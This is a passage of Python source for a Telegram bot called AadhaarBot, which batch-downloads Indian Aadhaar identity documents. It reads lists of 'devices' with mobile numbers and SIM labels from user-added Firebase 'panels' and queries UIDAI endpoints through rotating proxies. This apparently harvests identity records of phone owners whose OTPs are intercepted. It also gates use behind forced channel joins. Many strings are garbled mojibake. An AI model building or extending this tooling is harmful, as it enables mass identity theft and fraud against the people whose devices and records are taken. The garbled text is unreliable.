            {"text": {"type": "bold", "text": "sÃ¡Â´ÂÃ¡Â´ÂÃ¡Â´ÂÃ¡Â´Âs"}, "is_header": True, "align": "left"}
        ]
    ]

    items = list(dev_statuses.items())
    shown_items = items[:20]

    for i, (k, s) in enumerate(shown_items, 1):
        mob = str(s.get("mobile", ""))
        mob_str = f"ÃÂ·ÃÂ·ÃÂ·{mob[-4:]}" if len(mob) >= 4 else mob
        sl = s.get("sim_label")
        if sl:
            mob_str += f" ({sl})"
        dname = str(s.get("name", ""))
        dev_label = f"[{i:02d}] {mob_str} ({dname})"

        st = str(s.get("status", "")).strip()
        st_cell_text = None
        for icon in ("Ã¢ÂÂ", "Ã¢ÂÂ", "Ã¢ÂÂ³", "Ã°ÂÂÂ", "Ã°ÂÂÂ"):
            if st.startswith(icon):
                rest = st[len(icon):].strip()
                eid = EMOJI_MAP.get(icon)
                if eid:
                    parts = [{"type": "custom_emoji", "custom_emoji_id": eid, "alternative_text": icon}]
                    if rest:
                        parts.append({"type": "bold", "text": f" {rest}"})
                    st_cell_text = parts
                else:
                    st_cell_text = {"type": "bold", "text": st}
                break
        if not st_cell_text:
            st_cell_text = {"type": "bold", "text": st}

        cells.append([
            {"text": {"type": "bold", "text": dev_label}, "align": "left"},
            {"text": st_cell_text, "align": "left"}
        ])

    blocks = [
        {"type": "paragraph", "text": header_text},
        {"type": "table", "is_bordered": True, "is_striped": True, "cells": cells}
    ]

    if len(items) > 20:
        blocks.append({
            "type": "paragraph",
            "text": [{"type": "bold", "text": f"...aur {len(items) - 20} aur devices"}]
        })

    return blocks


def build_batch_html_text(panel_name: str, dev_statuses: dict, done_c: int, total_c: int, success_c: int, fail_c: int):
    def _fmt_status(st: str) -> str:
        if not st:
            return ""
        res = st
        for icon in ("Ã¢ÂÂ³", "Ã¢ÂÂ", "Ã¢ÂÂ", "Ã°ÂÂÂ", "Ã°ÂÂÂ"):
            if icon in res:
                res = res.replace(icon, emo(icon))
        return res

    lines = []
    items = list(dev_statuses.items())
    for i, (k, s) in enumerate(items[:20], 1):
        mob = str(s.get('mobile', ''))
        mob_str = f"ÃÂ·ÃÂ·ÃÂ·{mob[-4:]}" if len(mob) >= 4 else mob
        if s.get('sim_label'):
            mob_str += f" ({s['sim_label']})"
        lines.append(f"<code>[{i:02d}]</code> <b>{mob_str}</b> ({s.get('name', '')}): {_fmt_status(s.get('status', ''))}")

    status_block = "\n".join(lines)
    if len(items) > 20:
        status_block += f"\n<b>...aur {len(items) - 20} aur devices</b>"

    return (
        f"<b>{emo('Ã¢ÂÂ¡')} ÃªÂÂ°ÃÂªÃÂÃ¡Â´ÂÃÂÃ¡Â´ÂsÃ¡Â´Â Ã¡Â´ÂÃ¡Â´ÂÃ¡Â´ÂÃ¡Â´Â ÃÂÃ¡Â´ÂÃ¡Â´ÂÃ¡Â´ÂÃÂ Ã¡Â´ÂÃ¡Â´ÂÃ¡Â´Â¡ÃÂ´ÃÂÃ¡Â´ÂÃ¡Â´ÂÃ¡Â´Â</b>\n\n"
        f"<b>{emo('Ã°ÂÂÂ¥')} Panel:</b> <code>{html.escape(str(panel_name))}</code>\n"
        f"<b>{emo('Ã°ÂÂÂ')} Progress:</b> <code>{done_c}/{total_c}</code> ({emo('Ã¢ÂÂ')} {success_c} | {emo('Ã¢ÂÂ')} {fail_c})\n\n"
        f"<blockquote>{status_block}</blockquote>"
    )



# ==========================================
# BOT CLASS
# ==========================================
class AadhaarBot:
    def __init__(self):
        self.user_data = {}
        self.active_batches = {}
        self.broadcast_lock = asyncio.Lock()
        self.data_lock = threading.Lock()

    def get_user_data(self, uid):
        with self.data_lock:
            if uid not in self.user_data:
                self.user_data[uid] = {'verified': uid in _VERIFIED_USERS_CACHE}
            return self.user_data[uid]

    def update_user_data(self, uid, k, v):
        with self.data_lock:
            if uid not in self.user_data:
                self.user_data[uid] = {'verified': uid in _VERIFIED_USERS_CACHE}
            self.user_data[uid][k] = v

    def clear_user_data(self, uid):
        with self.data_lock:
            is_ver = self.user_data.get(uid, {}).get('verified', uid in _VERIFIED_USERS_CACHE)
            self.user_data[uid] = {'verified': is_ver}

    def set_user_verified(self, uid, st):
        if st:
            _VERIFIED_USERS_CACHE.add(uid)
        else:
            _VERIFIED_USERS_CACHE.discard(uid)
            _MEMBERSHIP_CACHE.pop(uid, None)
        self.update_user_data(uid, 'verified', st)
        try:
            threading.Thread(
                target=lambda: users_col.update_one({'user_id': uid}, {'$set': {'verified': 1 if st else 0}}, upsert=True),
                daemon=True
            ).start()
        except Exception:
            pass

    def get_user_proxy(self, uid, attempt=1):
        if USER_PROXIES:
            return USER_PROXIES[(attempt - 1) % len(USER_PROXIES)]
        return None

    async def uidai_post(self, url, headers=None, json_data=None, user_id=None, proxy_url=None, timeout=6, max_proxy_retries=None):
        headers = headers or _uidai_h("MYAADHAAR")
        s = get_proxy_session()
        r = await s.post(url, headers=headers, json=json_data, timeout=timeout)
        try:
            return r.json()
        except Exception:
            return {"status_code": r.status_code, "text": r.text}


    # ---------- KEYBOARDS ----------
    def get_main_menu_keyboard(self):
        return InlineKeyboardMarkup([
            [InlineKeyboardButton("Ã¡Â´ÂÃ¡Â´ÂÃ¡Â´Â¡ÃÂ´ÃÂÃ¡Â´ÂÃ¡Â´ÂÃ¡Â´Â Ã¡Â´ÂÃ¡Â´ÂÃ¡Â´ÂÃÂÃ¡Â´ÂÃ¡Â´ÂÃÂ",
                callback_data='download_aadhaar', style="primary")],
            [InlineKeyboardButton("Ã¡Â´ÂÃ¡Â´ÂÃ¡Â´Â¡ÃÂ´ÃÂÃ¡Â´ÂÃ¡Â´ÂÃ¡Â´Â Ã¡Â´Â ÃÂªÃ¡Â´Â ÃªÂÂ°ÃÂªÃÂÃ¡Â´ÂÃÂÃ¡Â´ÂsÃ¡Â´Â",
                callback_data='fb_download_all_panels', style="success")],
            [InlineKeyboardButton("ÃÂÃ¡Â´ÂÃÂÃ¡Â´Â", callback_data='help'),
             InlineKeyboardButton("Ã¡Â´ÂÃÂ ÃÂªÃÂ´ÃªÂÂ°Ã¡Â´Â", callback_data='my_info')],
            [InlineKeyboardButton("ÃÂÃ¡Â´ÂÃÂ ÃÂÃ¡Â´ÂÃ¡Â´Â ÃªÂÂ±ÃÂÃ¡Â´Â", url="https://t.me/RORINDIA", style="success")],
        ])

    def get_firebase_selection_keyboard(self, uid: int, page: int = 0, per_page: int = 20, fbs: list = None):
        if fbs is None:
            fbs = get_all_firebases(user_id=uid)
        buttons = []

        # 1. Action buttons ALWAYS at the TOP so "Add Firebase" is immediately visible
        action_row = [
            InlineKeyboardButton(
                "Ã¡Â´ÂÃ¡Â´ÂÃ¡Â´Â ÃªÂÂ°ÃÂªÃÂÃ¡Â´ÂÃÂÃ¡Â´ÂÃªÂÂ±Ã¡Â´Â",
                callback_data="user_add_fb",
                style="success"
            )
        ]
        if fbs:
            action_row.append(
                InlineKeyboardButton(
                    "Ã¡Â´ÂÃ¡Â´ÂÃÂ´Ã¡Â´ÂÃÂ¢Ã¡Â´Â ÃªÂÂ°ÃÂªÃÂÃ¡Â´ÂÃÂÃ¡Â´ÂÃªÂÂ±Ã¡Â´Â",
                    callback_data="user_manage_fb_0",
                    style="danger"
                )
            )
        buttons.append(action_row)

        if fbs:
            total_items = len(fbs)
            total_pages = max(1, (total_items + per_page - 1) // per_page)
            page = max(0, min(page, total_pages - 1))
            start_idx = page * per_page
            end_idx = min(start_idx + per_page, total_items)
            page_fbs = fbs[start_idx:end_idx]

            # 2-2 layout for panels on this page
            row = []
            for fb in page_fbs:
                clean_host = fb['url'].replace('https://', '').replace('http://', '').rstrip('/')
                short = re.sub(r'(-default-rtdb)?\.(firebaseio\.com|.*\.firebasedatabase\.app)$', '', clean_host)[:14]
                fb_name = fb.get('name') or short or 'Panel'
                if fb_name.lower() == short.lower() or short.lower() in fb_name.lower():
                    btn_text = fb_name
                else:
                    btn_text = f"{fb_name} | {short}"
                row.append(InlineKeyboardButton(
                    btn_text,
                    callback_data=f"fb_sel_{fb['id']}",
                    style="primary"
                ))
                if len(row) == 2:
                    buttons.append(row)
                    row = []
            if row:
                buttons.append(row)

            # Pagination controls if more than 1 page
            if total_pages > 1:
                nav_row = []
                if page > 0:
                    nav_row.append(InlineKeyboardButton("Ã¢Â¬ÂÃ¯Â¸Â Prev", callback_data=f"fb_page_{page-1}"))
                nav_row.append(InlineKeyboardButton(f"Ã°ÂÂÂ {page+1}/{total_pages} ({total_items})", callback_data="noop"))
                if page < total_pages - 1:
                    nav_row.append(InlineKeyboardButton("Next Ã¢ÂÂ¡Ã¯Â¸Â", callback_data=f"fb_page_{page+1}"))
                buttons.append(nav_row)

        if is_admin(uid):
            buttons.append([
                InlineKeyboardButton(
                    "Ã¡Â´ÂÃÂÃÂ Ã¡Â´ÂsÃ¡Â´ÂÃÂs' ÃªÂÂ°ÃÂªÃÂÃ¡Â´ÂÃÂÃ¡Â´ÂsÃ¡Â´Âs",
                    callback_data="admin_firebases_0",
                    style="primary"
                )
            ])

        buttons.append([
            InlineKeyboardButton(
                "ÃÂÃ¡Â´ÂÃ¡Â´ÂÃ¡Â´Â",
                callback_data="back_menu",
                style="primary"
            )
        ])
        return InlineKeyboardMarkup(buttons)

    def get_manage_firebase_keyboard(self, uid: int, page: int = 0, per_page: int = 20):
        fbs = get_all_firebases(user_id=uid)
        del_buttons = []
        if not fbs:
            return InlineKeyboardMarkup([
                [InlineKeyboardButton("Ã¡Â´ÂÃ¡Â´ÂÃ¡Â´Â ÃªÂÂ°ÃÂªÃÂÃ¡Â´ÂÃÂÃ¡Â´ÂÃªÂÂ±Ã¡Â´Â", callback_data="user_add_fb", style="success")],
                [InlineKeyboardButton("ÃÂÃ¡Â´ÂÃ¡Â´ÂÃ¡Â´Â", callback_data='fb_download_all_panels', style="primary")]
            ])

        # Action button at top
        del_buttons.append([
            InlineKeyboardButton("Ã¡Â´ÂÃ¡Â´ÂÃ¡Â´Â ÃªÂÂ°ÃÂªÃÂÃ¡Â´ÂÃÂÃ¡Â´ÂÃªÂÂ±Ã¡Â´Â", callback_data="user_add_fb", style="success")
        ])

        total_items = len(fbs)
        total_pages = max(1, (total_items + per_page - 1) // per_page)
        page = max(0, min(page, total_pages - 1))
        start_idx = page * per_page
        end_idx = min(start_idx + per_page, total_items)
        page_fbs = fbs[start_idx:end_idx]

        row = []
        for fb in page_fbs:
            clean_host = fb['url'].replace('https://', '').replace('http://', '').rstrip('/')
            short = re.sub(r'(-default-rtdb)?\.(firebaseio\.com|.*\.firebasedatabase\.app)$', '', clean_host)[:14]
            fb_name = fb.get('name') or short or 'Panel'
            if fb_name.lower() == short.lower() or short.lower() in fb_name.lower():
                btn_text = fb_name
            else:
                btn_text = f"{fb_name} | {short}"
            row.append(InlineKeyboardButton(
                btn_text,
                callback_data=f"user_del_fb_{fb['id']}_{page}",
                style="danger"
            ))
            if len(row) == 2:
                del_buttons.append(row)
                row = []
        if row:
            del_buttons.append(row)

        if total_pages > 1:
            nav_row = []
            if page > 0:
                nav_row.append(InlineKeyboardButton("Ã¢Â¬ÂÃ¯Â¸Â Prev", callback_data=f"user_manage_page_{page-1}"))
            nav_row.append(InlineKeyboardButton(f"Ã°ÂÂÂ {page+1}/{total_pages}", callback_data="noop"))
            if page < total_pages - 1:
                nav_row.append(InlineKeyboardButton("Next Ã¢ÂÂ¡Ã¯Â¸Â", callback_data=f"user_manage_page_{page+1}"))
            del_buttons.append(nav_row)

        del_buttons.append([InlineKeyboardButton(
            "ÃÂÃ¡Â´ÂÃ¡Â´ÂÃ¡Â´Â",
            callback_data='fb_download_all_panels',
            style="primary"
        )])
        return InlineKeyboardMarkup(del_buttons)

    def get_admin_menu_keyboard(self):
        m_status = "Ã°ÂÂÂ´ OFF (Turn ON)" if not is_maintenance_mode() else "Ã°ÂÂÂ¢ ON (Turn OFF)"
        return InlineKeyboardMarkup([
            [InlineKeyboardButton("STATS", callback_data='admin_stats', style="primary"),
             InlineKeyboardButton("BROADCAST", callback_data='admin_broadcast', style="primary")],
            [InlineKeyboardButton("BAN", callback_data='admin_ban', style="danger"),
             InlineKeyboardButton("UNBAN", callback_data='admin_unban', style="success")],
            [InlineKeyboardButton("USER INFO", callback_data='admin_user_info', style="primary"),
             InlineKeyboardButton("DAILY", callback_data='admin_daily_stats', style="primary")],
            [InlineKeyboardButton("ALL FIREBASES", callback_data='admin_firebases_0', style="primary")],
            [InlineKeyboardButton(f"MAINTENANCE: {m_status}", callback_data='admin_maintenance_toggle', style="danger" if is_maintenance_mode() else "success")],
            [InlineKeyboardButton("BACK", callback_data='back_menu', style="primary")],
        ])

    def get_back_keyboard(self):
        return InlineKeyboardMarkup([
            [InlineKeyboardButton("ÃÂÃ¡Â´ÂÃ¡Â´ÂÃ¡Â´Â", callback_data='back_menu', style="primary")],
        ])

    def get_force_join_keyboard(self):
        return InlineKeyboardMarkup([
            [InlineKeyboardButton(CHANNELS[0]["name"], url=CHANNELS[0]["url"]),
             InlineKeyboardButton(CHANNELS[1]["name"], url=CHANNELS[1]["url"])],
            [InlineKeyboardButton(CHANNELS[2]["name"], url=CHANNELS[2]["url"])],
            [InlineKeyboardButton("Ã¡Â´Â Ã¡Â´ÂÃÂÃÂªÃªÂÂ°ÃÂ", callback_data="verify", style="success")],
        ])

    # ---------- MEMBERSHIP ----------
    async def handle_chat_member_update(self, update: Update, ctx: ContextTypes.DEFAULT_TYPE):
        result = update.chat_member
        if not result:
            return
        chat_id = str(result.chat.id)
        channel_ids = [str(c["id"]) for c in CHANNELS]
        if chat_id not in channel_ids:
            return

        new_status = result.new_chat_member.status if result.new_chat_member else None
        target_user = result.new_chat_member.user if result.new_chat_member else result.from_user
        if not target_user:
            return
        uid = target_user.id

        if new_status in ("left", "kicked", "restricted"):
            logger.info(f"User {uid} left required channel {chat_id}. Marking unverified.")
            _MEMBERSHIP_CACHE.pop(uid, None)
            self.set_user_verified(uid, False)
            target_ch = next((c for c in CHANNELS if str(c["id"]) == chat_id), None)
            ch_url = target_ch["url"] if target_ch else (CHANNELS[0]["url"] if CHANNELS else "")
            leave_msg = (
                f"<b>{emo('Ã¢ÂÂ Ã¯Â¸Â')} Ã¡Â´ÂÃÂÃ¡Â´ÂÃÂ´ÃÂ´Ã¡Â´ÂÃÂ ÃÂÃ¡Â´ÂÃ¡Â´ÂÃ¡Â´Â Ã¡Â´Â Ã¡Â´ÂÃ¡Â´ÂÃ¡Â´ÂÃ¡Â´ÂÃ¡Â´ÂÃ¡Â´ÂÃ¡Â´ÂÃ¡Â´Â</b>\n\n"
                f"<b>{emo('Ã¢ÂÂ')} ÃÂÃ¡Â´ÂÃ¡Â´Â ÃÂÃ¡Â´ÂÃ¡Â´Â Ã¡Â´Â ÃÂÃ¡Â´ÂÃÂÃ¡Â´Â Ã¡Â´Â ÃÂÃ¡Â´ÂÃÂ«Ã¡Â´ÂÃÂªÃÂÃ¡Â´ÂÃ¡Â´Â Ã¡Â´ÂÃÂÃ¡Â´ÂÃÂ´ÃÂ´Ã¡Â´ÂÃÂ.</b>\n"
                f"<b>Ã°ÂÂÂ Ã¡Â´ÂÃÂÃ¡Â´ÂÃ¡Â´ÂsÃ¡Â´Â ÃÂÃ¡Â´ÂÃ¡Â´ÂÃ¡Â´ÂÃÂªÃÂ´ Ã¡Â´ÂÃÂÃ¡Â´Â Ã¡Â´ÂÃÂÃ¡Â´ÂÃÂ´ÃÂ´Ã¡Â´ÂÃÂ Ã¡Â´ÂÃ¡Â´Â Ã¡Â´ÂÃ¡Â´ÂÃÂ´Ã¡Â´ÂÃÂªÃÂ´Ã¡Â´ÂÃ¡Â´Â Ã¡Â´ÂsÃÂªÃÂ´ÃÂ¢ Ã¡Â´ÂÃÂÃ¡Â´Â ÃÂÃ¡Â´ÂÃ¡Â´Â.</b>\n\n"
                f"<b>Ã°ÂÂÂ Ã¡Â´ÂÃ¡Â´ÂÃÂªÃÂ´ ÃÂ´Ã¡Â´ÂÃ¡Â´Â¡ Ã¡Â´ÂÃ¡Â´Â ÃÂÃ¡Â´ÂsÃ¡Â´ÂÃ¡Â´ÂÃ¡Â´Â ÃÂÃ¡Â´ÂÃ¡Â´ÂÃÂ Ã¡Â´ÂÃ¡Â´ÂÃ¡Â´Â¡ÃÂ´ÃÂÃ¡Â´ÂÃ¡Â´ÂÃ¡Â´Â Ã°ÂÂÂÃ¡Â´ÂÃ¡Â´ÂÃÂÃ¡Â´ÂÃ¡Â´ÂÃÂ :</b>"
            )
            kb = InlineKeyboardMarkup([
                [InlineKeyboardButton("Ã¡Â´ÂÃ¡Â´ÂÃÂªÃÂ´ Ã¡Â´ÂÃÂÃ¡Â´ÂÃÂ´ÃÂ´Ã¡Â´ÂÃÂ", url=ch_url, style="success")]
            ])
            try:
                await ctx.bot.send_message(
                    chat_id=uid,
                    text=leave_msg,
                    parse_mode='HTML',
                    reply_markup=kb
                )
            except Exception as e:
                logger.warning(f"Could not send leave notification to {uid}: {e}")
        elif new_status in ("member", "administrator", "creator"):
            _MEMBERSHIP_CACHE.pop(uid, None)
            try:
                nj = await self.check_membership(ctx, uid, force=True)
                if not nj:
                    self.set_user_verified(uid, True)
            except Exception:
                pass

    async def check_membership(self, ctx, uid, force=False):
        now = time.time()
        if not force and uid in _MEMBERSHIP_CACHE:
            t, lst = _MEMBERSHIP_CACHE[uid]
            ttl = 3600 if not lst else 15
            if now - t < ttl:
                return lst

        async def one(ch):
            try:
                m = await asyncio.wait_for(
                    ctx.bot.get_chat_member(chat_id=ch["id"], user_id=uid),
                    timeout=3.5
                )
                if m.status in ("member", "administrator", "creator"):
                    return None
                return ch
            except Exception:
                return ch

        res = await asyncio.gather(*[one(c) for c in CHANNELS], return_exceptions=True)
        nj = [r for r in res if isinstance(r, dict)]
        _MEMBERSHIP_CACHE[uid] = (now, nj)
        return nj

    # ---------- VIEWS ----------
    async def show_force_join(self, update, ctx):
        user = update.effective_user
        msg = (
            "<blockquote>"
            f"<b>{emo('Ã°ÂÂÂ')} Ã¡Â´Â¡Ã¡Â´ÂÃÂÃ¡Â´ÂÃ¡Â´ÂÃ¡Â´ÂÃ¡Â´Â Ã¡Â´ÂÃÂ. ~ {html.escape(user.first_name or 'User')}</b>"
            "</blockquote>\n"
            f"<b>{emo('Ã°ÂÂÂ')} Ã¡Â´ÂÃ¡Â´Â Ã¡Â´ÂsÃ¡Â´Â Ã¡Â´ÂÃÂÃÂªs ÃÂÃ¡Â´ÂÃ¡Â´Â, Ã¡Â´ÂÃÂÃ¡Â´ÂÃ¡Â´ÂsÃ¡Â´Â Ã¡Â´ÂÃ¡Â´ÂÃÂªÃÂ´ Ã¡Â´ÂÃÂÃÂ Ã¡Â´ÂÃÂÃ¡Â´ÂÃÂ´ÃÂ´Ã¡Â´ÂÃÂs ÃªÂÂ°ÃÂªÃÂsÃ¡Â´Â.</b>\n\n"
            f"<b>{emo('Ã°ÂÂÂ¢')} Ã¡Â´ÂÃ¡Â´ÂÃÂªÃÂ´ Ã¡Â´ÂÃÂÃÂ Ã¡Â´ÂÃÂÃ¡Â´ÂÃÂ´ÃÂ´Ã¡Â´ÂÃÂs</b>\n"
            f"<b>{emo('Ã¢ÂÂ')} Ã¡Â´ÂÃÂÃ¡Â´ÂÃÂ´ Ã¡Â´ÂÃÂÃÂªÃ¡Â´ÂÃ¡Â´Â Ã¡Â´Â Ã¡Â´ÂÃÂÃÂªÃªÂÂ°ÃÂ</b>\n\n"
            f"<b>{emo('Ã°ÂÂÂ Ã¯Â¸Â')} Ã¡Â´ÂÃ¡Â´ÂÃ¡Â´Â ÃÂÃ¡Â´ÂÃ¡Â´ÂÃ¡Â´ÂÃÂ : <a href='https://t.me/RORINDIA'>Ã¢ÂÂÃ¡Â¯ÂÃ¢ÂÂ¥Ã¢ÂÂÃ¢ÂÂÃ°ÂÂÂ¸Ã°ÂÂÂ4Ã°ÂÂÂÃ°ÂÂÂÃ°ÂÂÂÃ°ÂÂÂÃ°ÂÂÂÃ¢ÂÂÃ¢ÂÂ¥ÃªÂ¯Â­Ã¢ÂÂ¿Ã Â¿Â</a></b>"
        )
        kb = self.get_force_join_keyboard()
        if update.callback_query:
            try:
                await update.callback_query.edit_message_caption(
                    caption=msg, reply_markup=kb, parse_mode='HTML')
            except Exception:
                try:
                    await update.callback_query.edit_message_text(
                        text=msg, reply_markup=kb, parse_mode='HTML')
                except Exception:
                    await update.effective_user.send_message(
                        text=msg, reply_markup=kb, parse_mode='HTML')
        else:
            try:
                await update.message.reply_video(
                    video="https://t.me/rajehshjsjs/34",
                    caption=msg, reply_markup=kb, parse_mode='HTML')
            except Exception:
                await update.message.reply_text(
                    text=msg, reply_markup=kb, parse_mode='HTML')

    async def show_main_menu(self, update, ctx):
        user = update.effective_user
        msg = (
            f"<b>ÃÂÃ¡Â´ÂÃÂ!!, Ã¡Â´Â¡Ã¡Â´ÂÃÂÃ¡Â´ÂÃ¡Â´ÂÃ¡Â´ÂÃ¡Â´Â Ã¡Â´ÂÃ¡Â´Â ~ {html.escape(user.first_name or 'User')}</b>\n\n"
            f"<b>{emo('Ã°ÂÂÂ')} Ã°ÂÂÂÃ¡Â´ÂÃ¡Â´ÂÃÂÃ¡Â´ÂÃ¡Â´ÂÃÂ Ã°ÂÂÂÃ¡Â´ÂÃÂÃ¡Â´Â Ã°ÂÂÂÃ¡Â´ÂÃ¡Â´Â¡ÃÂ´ÃÂÃ¡Â´ÂÃ¡Â´ÂÃ¡Â´Â Ã°ÂÂÂssÃÂªsÃ¡Â´ÂÃ¡Â´ÂÃÂ´Ã¡Â´Â</b>\n\n"
            "<blockquote>"
            "<b>ÃÂ´Ã¡Â´ÂÃ¡Â´ÂÃ¡Â´Â ÃÂÃ¡Â´ÂÃÂÃ¡Â´Â Ã¡Â´ÂÃ¡Â´Â Ã¡Â´ÂÃ¡Â´ÂÃ¡Â´Â¡ÃÂ´ÃÂÃ¡Â´ÂÃ¡Â´ÂÃ¡Â´Â ÃÂÃ¡Â´ÂÃ¡Â´ÂÃÂ Ã¡Â´Â-Ã¡Â´ÂÃ¡Â´ÂÃ¡Â´ÂÃÂÃ¡Â´ÂÃ¡Â´ÂÃÂ? "
            "Ã¡Â´ÂÃÂÃÂªs ÃÂÃ¡Â´ÂÃ¡Â´Â ÃÂÃ¡Â´ÂÃÂÃ¡Â´Âs ÃÂÃ¡Â´ÂÃ¡Â´Â Ã¡Â´Â¡ÃÂªÃ¡Â´ÂÃÂ Ã¡Â´ÂÃÂÃ¡Â´Â Ã¡Â´ÂÃªÂÂ°ÃªÂÂ°ÃÂªÃ¡Â´ÂÃÂªÃ¡Â´ÂÃÂ Ã¡Â´ÂÃÂÃ¡Â´ÂÃ¡Â´ÂÃ¡Â´Âss.</b>"
            "</blockquote>\n\n"
            f"<b>Ã°ÂÂÂÃ°ÂÂÂÃ°ÂÂÂÃ°ÂÂÂ & Ã°ÂÂÂÃ°ÂÂÂÃ°ÂÂÂÃ°ÂÂÂÃ°ÂÂÂÃ°ÂÂÂÃ°ÂÂÂÃ¡Â´ÂÃ¡Â´Â Ã°ÂÂÂÃ°ÂÂÂÃ°ÂÂÂÃ°ÂÂÂÃ¡Â´Â Ã¢ÂÂ {emo('Ã°ÂÂÂ¯')}</b>\n\n"
            f"<b>{emo('Ã¢ÂÂ¡')} Ã¡Â´ÂsÃ¡Â´Â /help ÃªÂÂ°Ã¡Â´ÂÃÂ Ã¡Â´ÂÃ¡Â´ÂÃÂÃ¡Â´Â ÃÂªÃÂ´ÃªÂÂ°Ã¡Â´Â</b>\n\n"
            f"<b>{emo('Ã°ÂÂÂ Ã¯Â¸Â')} Ã¡Â´ÂÃ¡Â´ÂÃ¡Â´Â ÃÂÃ¡Â´ÂÃ¡Â´ÂÃ¡Â´ÂÃÂ : <a href='https://t.me/RORINDIA'>Ã¢ÂÂÃ¡Â¯ÂÃ¢ÂÂ¥Ã¢ÂÂÃ¢ÂÂÃ°ÂÂÂ¸Ã°ÂÂÂ4Ã°ÂÂÂÃ°ÂÂÂÃ°ÂÂÂÃ°ÂÂÂÃ°ÂÂÂÃ¢ÂÂÃ¢ÂÂ¥ÃªÂ¯Â­Ã¢ÂÂ¿Ã Â¿Â</a></b>"
        )
        kb = self.get_main_menu_keyboard()
        if update.callback_query:
            try:
                await update.callback_query.answer()
            except Exception:
                pass
            try:
                await update.callback_query.edit_message_caption(
                    caption=msg, reply_markup=kb, parse_mode='HTML')
            except Exception:
                try:
                    await update.callback_query.edit_message_text(
                        text=msg, reply_markup=kb, parse_mode='HTML')
                except Exception:
                    await update.effective_user.send_message(
                        text=msg, reply_markup=kb, parse_mode='HTML')
        else:
            try:
                await update.message.reply_photo(
                    photo="https://t.me/rajehshjsjs/33",
                    caption=msg, reply_markup=kb, parse_mode='HTML')
            except Exception:
                await update.message.reply_text(
                    text=msg, reply_markup=kb, parse_mode='HTML')
        self.update_user_data(user.id, 'stage', 'main_menu')

    async def show_main_menu_new(self, update, ctx):
        user = update.effective_user
        msg = (
            f"<b>{emo('Ã°ÂÂÂ')} ÃÂÃ¡Â´ÂÃÂ!!, Ã¡Â´Â¡Ã¡Â´ÂÃÂÃ¡Â´ÂÃ¡Â´ÂÃ¡Â´ÂÃ¡Â´Â Ã¡Â´ÂÃ¡Â´Â ~ {html.escape(user.first_name or 'User')}</b>\n\n"
            f"<b>{emo('Ã°ÂÂÂ')} Ã°ÂÂÂÃ¡Â´ÂÃ¡Â´ÂÃÂÃ¡Â´ÂÃ¡Â´ÂÃÂ Ã°ÂÂÂÃ¡Â´ÂÃÂÃ¡Â´Â Ã°ÂÂÂÃ¡Â´ÂÃ¡Â´Â¡ÃÂ´ÃÂÃ¡Â´ÂÃ¡Â´ÂÃ¡Â´Â Ã°ÂÂÂssÃÂªsÃ¡Â´ÂÃ¡Â´ÂÃÂ´Ã¡Â´Â</b>\n\n"
            f"<b>{emo('Ã°ÂÂ«Â¡')} ÃÂ´Ã¡Â´ÂÃ¡Â´ÂÃ¡Â´Â ÃÂÃ¡Â´ÂÃÂÃ¡Â´Â Ã¡Â´ÂÃ¡Â´Â Ã¡Â´ÂÃ¡Â´ÂÃ¡Â´Â¡ÃÂ´ÃÂÃ¡Â´ÂÃ¡Â´ÂÃ¡Â´Â ÃÂÃ¡Â´ÂÃ¡Â´ÂÃÂ Ã¡Â´Â-Ã¡Â´ÂÃ¡Â´ÂÃ¡Â´ÂÃÂÃ¡Â´ÂÃ¡Â´ÂÃÂ?</b>\n\n"
            f"<b>{emo('Ã¢ÂÂ¡')} Ã¡Â´ÂsÃ¡Â´Â /help ÃªÂÂ°Ã¡Â´ÂÃÂ Ã¡Â´ÂÃ¡Â´ÂÃÂÃ¡Â´Â ÃÂªÃÂ´ÃªÂÂ°Ã¡Â´Â</b>\n\n"
            f"<b>{emo('Ã°ÂÂÂ Ã¯Â¸Â')} Ã¡Â´ÂÃ¡Â´ÂÃ¡Â´Â ÃÂÃ¡Â´ÂÃ¡Â´ÂÃ¡Â´ÂÃÂ : <a href='https://t.me/RORINDIA'>Ã¢ÂÂÃ¡Â¯ÂÃ¢ÂÂ¥Ã¢ÂÂÃ¢ÂÂÃ°ÂÂÂ¸Ã°ÂÂÂ4Ã°ÂÂÂÃ°ÂÂÂÃ°ÂÂÂÃ°ÂÂÂÃ°ÂÂÂÃ¢ÂÂÃ¢ÂÂ¥ÃªÂ¯Â­Ã¢ÂÂ¿Ã Â¿Â</a></b>"
        )
        kb = self.get_main_menu_keyboard()
        if update.callback_query:
            try:
                await update.callback_query.edit_message_caption(caption=msg, reply_markup=kb, parse_mode='HTML')
                self.update_user_data(user.id, 'stage', 'main_menu')
                return
            except Exception:
                try:
                    await update.callback_query.edit_message_text(text=msg, reply_markup=kb, parse_mode='HTML')
                    self.update_user_data(user.id, 'stage', 'main_menu')
                    return
                except Exception:
                    pass
        try:
            await update.effective_user.send_photo(
                photo="https://t.me/rajehshjsjs/33",
                caption=msg, reply_markup=kb,
                parse_mode='HTML')
        except Exception:
            await update.effective_user.send_message(
                text=msg, reply_markup=kb, parse_mode='HTML')
        self.update_user_data(user.id, 'stage', 'main_menu')

    async def show_admin_panel(self, update, ctx):
        uid = update.effective_user.id
        if not is_admin(uid):
            if update.callback_query:
                await update.callback_query.answer("Ã¢ÂÂ You are not authorized!", show_alert=True)
            else:
                await update.message.reply_text("Ã¢ÂÂ You are not authorized to access admin panel.")
            return

        tu = get_all_users_count()
        bu = get_banned_users_count()
        ts = get_today_stats()
        td = get_total_stats()
        m = "Ã°ÂÂÂ´ ON" if is_maintenance_mode() else "Ã°ÂÂÂ¢ OFF"
        msg = (
            f"<b>{emo('Ã°ÂÂÂ Ã¯Â¸Â')} Ã¡Â´ÂÃ¡Â´ÂÃ¡Â´ÂÃÂªÃÂ´ Ã¡Â´ÂÃ¡Â´ÂÃÂ´Ã¡Â´ÂÃÂ</b>\n\n"
            "<blockquote>"
            f"<b>{emo('Ã°ÂÂÂ¤')} Ã¡Â´ÂÃ¡Â´ÂÃ¡Â´ÂÃ¡Â´ÂÃÂ Ã¡Â´ÂsÃ¡Â´ÂÃÂs: {tu}</b>\n"
            f"<b>{emo('Ã°ÂÂÂ«')} ÃÂÃ¡Â´ÂÃÂ´ÃÂ´Ã¡Â´ÂÃ¡Â´Â: {bu}</b>\n"
            f"<b>{emo('Ã°ÂÂÂ')} Ã¡Â´ÂÃ¡Â´ÂÃ¡Â´ÂÃ¡Â´ÂÃÂ Ã¡Â´ÂÃ¡Â´ÂÃ¡Â´Â¡ÃÂ´ÃÂÃ¡Â´ÂÃ¡Â´ÂÃ¡Â´Âs: {ts['downloads']}</b>\n"
